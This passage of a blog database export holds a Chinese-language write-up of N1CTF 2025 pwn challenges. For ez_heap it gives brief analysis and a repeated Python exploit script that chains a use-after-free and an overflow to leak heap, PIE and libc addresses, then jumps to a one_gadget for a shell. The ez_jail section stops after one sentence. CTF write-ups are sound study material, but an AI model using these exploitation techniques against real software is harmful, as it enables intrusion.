io.sendlineafter(\"name:(size<16)\\n\",name)\none=[0xef52b,0xef4ce]\nname=b\"a\"*0xf\nmain=0x1CCB\nmenu=0x1DA1\n\ndef pwn():\n    io.sendlineafter(\"Do you want to play a game with me?\\n\",pas)\n    add(name,0x68,b'a\\n')\n    add(name,0x68,b'b\\n')\n    add(name,0x68,b'c\\n')\n    add(name,0x68,b'd\\n')\n    # leak pie heap\n    payload=name+b\"\\x00\"+b\"\\xba\"\n    edit(0,payload)\n    show(0)\n    io.recvuntil(\"content: \")\n    heap=u64(io.recv(6).rjust(8,b\"\\x00\"))\n    pie=u64(io.recv(6).ljust(8,b\"\\x00\"))-0x4080\n    logv(\"pie\",hex(pie))\n    logv(\"heap\",hex(heap))\n    delete(1,str(pie+main).encode())\n    # count & leak libc\n\n    puts_got=elf.got[\"puts\"]+pie\n    puts_encode=puts_got ^ 0x787878787878c278\n    payload=name+b\"\\x00\"+p64(puts_encode)\n    io.sendlineafter(\"Do you want to play a game with me?\\n\",pas)\n    edit(2,payload)\n    show(2)\n    io.recvuntil(\"content: \")\n    puts=u64(io.recv(6).ljust(8,b\"\\x00\"))\n    libc_base=puts-libc.sym[\"puts\"]\n    logv(\"puts\",hex(puts))\n    logv(\"libc_base\",hex(libc_base))\n    getshell=libc_base+one[0]\n    delete(1,str(getshell).encode())\n    \n    \nwhile True:\n    try:\n        io,elf=loadfile(\"./heap\",\"\",0)\n        pwn()\n        io.interactive()\n    except:\n        io.close()\n\n\n\n```\n\n## ez_jail\n\n## 静态分析\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250920223356355.png)\n\nuaf可以配合`show`,泄露main_arena 信息来泄露libc ,但是要如何利用呢?\n\n","slug":"ctf比赛复现/N1ctf-2025-pwn","published":1,"date":"2025-10-06T14:48:09.862Z","updated":"2025-10-06T15:19:38.007Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2i0000buomy7uk43j1m","content":"<h1 id=\"N1ctf-2025-pwn\"><a href=\"#N1ctf-2025-pwn\" class=\"headerlink\" title=\"N1ctf-2025-pwn\"></a>N1ctf-2025-pwn</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><h2 id=\"ez-heap\"><a href=\"#ez-heap\" class=\"headerlink\" title=\"ez_heap\"></a>ez_heap</h2><h3 id=\"静态分析\"><a href=\"#静态分析\" class=\"headerlink\" title=\"静态分析\"></a>静态分析</h3><p>struct：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">my_struct</span>&#123;</span></span><br><span class=\"line\">__int64 name_size;</span><br><span class=\"line\">__int64 conten_size;</span><br><span class=\"line\"><span class=\"type\">char</span> name[<span class=\"number\">16</span>];</span><br><span class=\"line\">__int64 heap_addr;</span><br><span class=\"line\">__int64 arry_addr;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其实是用一个大堆块，每0x30 用来保存一个堆块的相关信息。 每次add，会申请新堆块来保存content</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250914201234102.png\"></p>\n<p>在这里发现，可以通过<code>*a3</code> 造成一个uaf 漏洞,配合后面<code>show()</code>可以泄露出main_arena,那么就拿到了libc.</p>\n<p>但是进一步发现，edit和show 都只能使用一次，而且 <code>*a3</code> 为0 时,delete 会返回到v7(由用户控制),但是我们没有任何地址信息.</p>\n<p>edit的scanf 虽然有溢出漏洞,但是<code>\\x00</code> 截断的问题还是没有解决.如果可以知道pie ,我们可以覆盖heapaddr 为got 表把libc泄露出来.</p>\n<p>等一下,原本这里是堆的地址,我们现在可以计算目标和这里原地址的偏移,同时已知^运算的另一个数,那么我们其实可以计算最后的结果,嘶~~ .那么就可以把pie泄露出来,接下来就是看能不能正常从edit和show里返回了。</p>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>,<span class=\"string\">&#x27;-l&#x27;</span>,<span class=\"string\">&#x27;66%&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 一些阻碍</span></span><br><span class=\"line\">pas=<span class=\"string\">b&quot;admin&quot;</span>+<span class=\"string\">b&quot;:&quot;</span>+<span class=\"string\">b&quot;x&quot;</span>+p8(<span class=\"number\">0xc2</span>)+<span class=\"string\">b&quot;xxxxxx&quot;</span>+<span class=\"string\">b&quot;:Junior:1234&quot;</span></span><br><span class=\"line\">keys=<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">7</span></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io,&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># b *$rebase(0x1C20)</span></span><br><span class=\"line\"><span class=\"comment\"># b *$rebase(0x1ae4)</span></span><br><span class=\"line\"><span class=\"comment\"># b *$rebase(0x1C0B)</span></span><br><span class=\"line\"><span class=\"comment\"># b *$rebase(0x1952)</span></span><br><span class=\"line\"><span class=\"comment\"># &#x27;&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># onegadgets</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">0xef52b onegadgets</span></span><br><span class=\"line\"><span class=\"string\">0xef4ce onegadgets</span></span><br><span class=\"line\"><span class=\"string\">0x3F60 puts</span></span><br><span class=\"line\"><span class=\"string\">0x4080 </span></span><br><span class=\"line\"><span class=\"string\">b *$rebase(0x1D4C)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">key</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Please enter your key:\\n&quot;</span>,keys)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">name,size,content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Please enter your choice.~~&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    key()</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;name:(size&lt;16)\\n&quot;</span>,name)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;content size:(size&lt;=0x70)\\n&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;content:\\n&quot;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx,num</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Please enter your choice.~~\\n&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    key()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;index:\\n&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;numbers:\\n&quot;</span>,num)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Please enter your choice.~~\\n&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">    key()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;index:\\n&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,name</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Please enter your choice.~~\\n&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">4</span>))</span><br><span class=\"line\">    key()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;index:\\n&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;name:(size&lt;16)\\n&quot;</span>,name)</span><br><span class=\"line\">one=[<span class=\"number\">0xef52b</span>,<span class=\"number\">0xef4ce</span>]</span><br><span class=\"line\">name=<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0xf</span></span><br><span class=\"line\">main=<span class=\"number\">0x1CCB</span></span><br><span class=\"line\">menu=<span class=\"number\">0x1DA1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Do you want to play a game with me?\\n&quot;</span>,pas)</span><br><span class=\"line\">    add(name,<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;a\\n&#x27;</span>)</span><br><span class=\"line\">    add(name,<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;b\\n&#x27;</span>)</span><br><span class=\"line\">    add(name,<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;c\\n&#x27;</span>)</span><br><span class=\"line\">    add(name,<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;d\\n&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># leak pie heap</span></span><br><span class=\"line\">    payload=name+<span class=\"string\">b&quot;\\x00&quot;</span>+<span class=\"string\">b&quot;\\xba&quot;</span></span><br><span class=\"line\">    edit(<span class=\"number\">0</span>,payload)</span><br><span class=\"line\">    show(<span class=\"number\">0</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;content: &quot;</span>)</span><br><span class=\"line\">    heap=u64(io.recv(<span class=\"number\">6</span>).rjust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">    pie=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))-<span class=\"number\">0x4080</span></span><br><span class=\"line\">    logv(<span class=\"string\">&quot;pie&quot;</span>,<span class=\"built_in\">hex</span>(pie))</span><br><span class=\"line\">    logv(<span class=\"string\">&quot;heap&quot;</span>,<span class=\"built_in\">hex</span>(heap))</span><br><span class=\"line\">    delete(<span class=\"number\">1</span>,<span class=\"built_in\">str</span>(pie+main).encode())</span><br><span class=\"line\">    <span class=\"comment\"># count &amp; leak libc</span></span><br><span class=\"line\"></span><br><span class=\"line\">    puts_got=elf.got[<span class=\"string\">&quot;puts&quot;</span>]+pie</span><br><span class=\"line\">    puts_encode=puts_got ^ <span class=\"number\">0x787878787878c278</span></span><br><span class=\"line\">    payload=name+<span class=\"string\">b&quot;\\x00&quot;</span>+p64(puts_encode)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Do you want to play a game with me?\\n&quot;</span>,pas)</span><br><span class=\"line\">    edit(<span class=\"number\">2</span>,payload)</span><br><span class=\"line\">    show(<span class=\"number\">2</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;content: &quot;</span>)</span><br><span class=\"line\">    puts=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">    libc_base=puts-libc.sym[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">    logv(<span class=\"string\">&quot;puts&quot;</span>,<span class=\"built_in\">hex</span>(puts))</span><br><span class=\"line\">    logv(<span class=\"string\">&quot;libc_base&quot;</span>,<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">    getshell=libc_base+one[<span class=\"number\">0</span>]</span><br><span class=\"line\">    delete(<span class=\"number\">1</span>,<span class=\"built_in\">str</span>(getshell).encode())</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        io,elf=loadfile(<span class=\"string\">&quot;./heap&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">        pwn()</span><br><span class=\"line\">        io.interactive()</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        io.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ez-jail\"><a href=\"#ez-jail\" class=\"headerlink\" title=\"ez_jail\"></a>ez_jail</h2><h2 id=\"静态分析-1\"><a href=\"#静态分析-1\" class=\"headerlink\" title=\"静态分析\"></a>静态分析</h2><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250920223356355.png\" alt=\"image.png\"></p>\n<p>uaf可以配合<code>show</code>,泄露main_arena 信息来泄露libc ,但是要如何利用呢?</p>\n","excerpt":"","more":"<h1 id=\"N1ctf-2025-pwn\"><a href=\"#N1ctf-2025-pwn\" class=\"headerlink\" title=\"N1ctf-2025-pwn\"></a>N1ctf-2025-pwn</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><h2 id=\"ez-heap\"><a href=\"#ez-heap\" class=\"headerlink\" title=\"ez_heap\"></a>ez_heap</h2><h3 id=\"静态分析\"><a href=\"#静态分析\" class=\"headerlink\" title=\"静态分析\"></a>静态分析</h3><p>struct：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">my_struct</span>&#123;</span></span><br><span class=\"line\">__int64 name_size;</span><br><span class=\"line\">__int64 conten_size;</span><br><span class=\"line\"><span class=\"type\">char</span> name[<span class=\"number\">16</span>];</span><br><span class=\"line\">__int64 heap_addr;</span><br><span class=\"line\">__int64 arry_addr;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其实是用一个大堆块，每0x30 用来保存一个堆块的相关信息。 每次add，会申请新堆块来保存content</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250914201234102.png\"></p>\n<p>在这里发现，可以通过<code>*a3</code> 造成一个uaf 漏洞,配合后面<code>show()</code>可以泄露出main_arena,那么就拿到了libc.</p>\n<p>但是进一步发现，edit和show 都只能使用一次，而且 <code>*a3</code> 为0 时,delete 会返回到v7(由用户控制),但是我们没有任何地址信息.</p>\n<p>edit的scanf 虽然有溢出漏洞,但是<code>\\x00</code> 截断的问题还是没有解决.如果可以知道pie ,我们可以覆盖heapaddr 为got 表把libc泄露出来.</p>\n<p>等一下,原本这里是堆的地址,我们现在可以计算目标和这里原地址的偏移,同时已知^运算的另一个数,那么我们其实可以计算最后的结果,嘶~~ .那么就可以把pie泄露出来,接下来就是看能不能正常从edit和show里返回了。</p>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>,<span class=\"string\">&#x27;-l&#x27;</span>,<span class=\"string\">&#x27;66%&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 一些阻碍</span></span><br><span class=\"line\">pas=<span class=\"string\">b&quot;admin&quot;</span>+<span class=\"string\">b&quot;:&quot;</span>+<span class=\"string\">b&quot;x&quot;</span>+p8(<span class=\"number\">0xc2</span>)+<span class=\"string\">b&quot;xxxxxx&quot;</span>+<span class=\"string\">b&quot;:Junior:1234&quot;</span></span><br><span class=\"line\">keys=<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">7</span></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io,&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># b *$rebase(0x1C20)</span></span><br><span class=\"line\"><span class=\"comment\"># b *$rebase(0x1ae4)</span></span><br><span class=\"line\"><span class=\"comment\"># b *$rebase(0x1C0B)</span></span><br><span class=\"line\"><span class=\"comment\"># b *$rebase(0x1952)</span></span><br><span class=\"line\"><span class=\"comment\"># &#x27;&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># onegadgets</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">0xef52b onegadgets</span></span><br><span class=\"line\"><span class=\"string\">0xef4ce onegadgets</span></span><br><span class=\"line\"><span class=\"string\">0x3F60 puts</span></span><br><span class=\"line\"><span class=\"string\">0x4080 </span></span><br><span class=\"line\"><span class=\"string\">b *$rebase(0x1D4C)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">key</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Please enter your key:\\n&quot;</span>,keys)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">name,size,content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Please enter your choice.~~&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    key()</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;name:(size&lt;16)\\n&quot;</span>,name)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;content size:(size&lt;=0x70)\\n&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;content:\\n&quot;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx,num</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Please enter your choice.~~\\n&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    key()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;index:\\n&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;numbers:\\n&quot;</span>,num)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Please enter your choice.~~\\n&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">    key()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;index:\\n&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,name</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Please enter your choice.~~\\n&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">4</span>))</span><br><span class=\"line\">    key()</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;index:\\n&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;name:(size&lt;16)\\n&quot;</span>,name)</span><br><span class=\"line\">one=[<span class=\"number\">0xef52b</span>,<span class=\"number\">0xef4ce</span>]</span><br><span class=\"line\">name=<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0xf</span></span><br><span class=\"line\">main=<span class=\"number\">0x1CCB</span></span><br><span class=\"line\">menu=<span class=\"number\">0x1DA1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Do you want to play a game with me?\\n&quot;</span>,pas)</span><br><span class=\"line\">    add(name,<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;a\\n&#x27;</span>)</span><br><span class=\"line\">    add(name,<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;b\\n&#x27;</span>)</span><br><span class=\"line\">    add(name,<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;c\\n&#x27;</span>)</span><br><span class=\"line\">    add(name,<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;d\\n&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># leak pie heap</span></span><br><span class=\"line\">    payload=name+<span class=\"string\">b&quot;\\x00&quot;</span>+<span class=\"string\">b&quot;\\xba&quot;</span></span><br><span class=\"line\">    edit(<span class=\"number\">0</span>,payload)</span><br><span class=\"line\">    show(<span class=\"number\">0</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;content: &quot;</span>)</span><br><span class=\"line\">    heap=u64(io.recv(<span class=\"number\">6</span>).rjust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">    pie=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))-<span class=\"number\">0x4080</span></span><br><span class=\"line\">    logv(<span class=\"string\">&quot;pie&quot;</span>,<span class=\"built_in\">hex</span>(pie))</span><br><span class=\"line\">    logv(<span class=\"string\">&quot;heap&quot;</span>,<span class=\"built_in\">hex</span>(heap))</span><br><span class=\"line\">    delete(<span class=\"number\">1</span>,<span class=\"built_in\">str</span>(pie+main).encode())</span><br><span class=\"line\">    <span class=\"comment\"># count &amp; leak libc</span></span><br><span class=\"line\"></span><br><span class=\"line\">    puts_got=elf.got[<span class=\"string\">&quot;puts&quot;</span>]+pie</span><br><span class=\"line\">    puts_encode=puts_got ^ <span class=\"number\">0x787878787878c278</span></span><br><span class=\"line\">    payload=name+<span class=\"string\">b&quot;\\x00&quot;</span>+p64(puts_encode)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Do you want to play a game with me?\\n&quot;</span>,pas)</span><br><span class=\"line\">    edit(<span class=\"number\">2</span>,payload)</span><br><span class=\"line\">    show(<span class=\"number\">2</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;content: &quot;</span>)</span><br><span class=\"line\">    puts=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">    libc_base=puts-libc.sym[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">    logv(<span class=\"string\">&quot;puts&quot;</span>,<span class=\"built_in\">hex</span>(puts))</span><br><span class=\"line\">    logv(<span class=\"string\">&quot;libc_base&quot;</span>,<span 